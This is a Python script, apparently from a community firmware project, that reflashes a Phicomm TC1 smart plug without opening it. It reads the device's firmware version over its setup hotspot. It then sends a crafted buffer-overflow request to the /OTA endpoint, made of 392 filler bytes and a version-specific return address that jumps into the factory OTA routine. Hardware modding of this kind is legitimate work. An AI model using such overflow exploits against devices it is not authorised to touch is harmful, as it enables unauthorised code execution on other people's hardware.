#!/usr/bin/env python3
# 版权所有 © 2026 phicomm-io（作者：FUjr）。保留所有权利。
# 转载须注明出处：https://github.com/phicomm-io/iotcloud-community-firmware
# 禁止修改；完整条款见仓库根目录 LICENSE。
"""读取 TC1 原厂版本并发送免拆刷机触发请求。

用法：python3 tc1-trigger.py

先连接 TC1 配网热点 10.10.10.1:8000 读取 /read-domain 的 VERSION，
再按该版本选择目标地址发送 397 字节请求。没有参数，也不需要手工选版本：
读不到设备或版本未经验证时直接退出，不会回退到其它版本的地址。

退出码：0 设备已应答；2 结果未确认（先观察设备，不要重发）；1 识别或网络错误。
"""

import http.client
import json
import struct
import sys

HOST = "10.10.10.1"
PORT = 8000

# 原厂版本 -> 工厂 OTA 线程体地址。三版本帧内偏移一致，仅目标地址不同。
TARGETS = {
    "1.0.0.26": 0x1F073D9F,
    "1.0.0.24": 0x1F073D63,
    "1.0.0.21": 0x1F073D2F,
}
FILLER = 392


def request(method, path, body=None, timeout=30):
    connection = http.client.HTTPConnection(HOST, PORT, timeout=timeout)
    try:
        connection.request(method, path, body=body,
                           headers={"Content-Type": "application/json", "Connection": "close"})
        response = connection.getresponse()
        return response.status, response.read(65536)
    finally:
        connection.close()


def payload(target):
    return b"A" * FILLER + struct.pack("<I", target) + b"\x00"


def main():
    try:
        status, body = request("GET", "/read-domain", timeout=10)
    except OSError as exc:
        print(f"连不上 {HOST}:{PORT}：{exc}", file=sys.stderr)
        print("确认电脑已连接 TC1 配网热点，并拿到了 10.10.10.x 地址。", file=sys.stderr)
        return 1
    if status != 200:
        print(f"/read-domain 返回 HTTP {status}，设备可能不在配网模式。", file=sys.stderr)
        return 1
    try:
        version = json.loads(body)["VERSION"]
    except (ValueError, KeyError, TypeError):
        print(f"/read-domain 没有返回可识别的 VERSION：{body[:160]!r}", file=sys.stderr)
        return 1

    target = TARGETS.get(version)
    if target is None:
        print(f"原厂版本 {version} 不在已验证范围（{'、'.join(sorted(TARGETS))}），已停止。",
              file=sys.stderr)
        return 1

    print(f"原厂版本 {version}，发送 397 字节触发请求。", flush=True)
    try:
        status, body = request("POST", "/OTA", payload(target))
    except OSError as exc:
        print(f"触发请求连接中断，结果未确认：{exc}", file=sys.stderr)
        print("先观察 TFTP 日志和设备，不要重发。", file=sys.stderr)
        return 2
    if not body.startswith(b"OTA "):
        print(f"设备响应未确认：HTTP {status} {body[:120]!r}", file=sys.stderr)
        print("先观察 TFTP 日志和设备，不要重发。", file=sys.stderr)
        return 2

    print("设备已应答。现在看 TFTP 日志：出现下载记录即已开始传输。", flush=True)
    print("下载期间保持供电，不要关 TFTP、拔网线或断电。", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
